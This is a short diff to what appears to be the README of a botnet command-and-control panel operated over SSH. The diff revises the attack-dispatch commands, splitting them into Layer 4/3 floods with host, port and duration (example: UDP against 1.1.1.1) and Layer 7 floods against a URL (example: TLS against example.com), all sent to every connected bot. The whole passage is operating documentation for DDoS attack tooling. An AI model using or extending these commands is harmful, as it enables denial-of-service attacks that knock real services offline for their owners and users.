@@ -154,7 +154,8 @@ Once connected via SSH, the following commands are supported:
 | `bots` | Displays the current number of connected bot clients |
 | `clear` / `cls` | Clears the terminal screen |
 | `exit` / `quit` | Terminates the SSH session |
-| `.<method> <host> <port> <time>` | Dispatches specified attack method to all active bots (e.g. `.https https://example.com 443 60`) |
+| `.<l4_method> <host> <port> <time>` | Dispatches Layer 4 / Layer 3 method (e.g. `.udp 1.1.1.1 80 60`) |
+| `.<l7_method> <url> <time>` | Dispatches Layer 7 method without requiring port (e.g. `.tls https://example.com 60`) |
 
 ### Supported Attack Methods (`methods`)
 
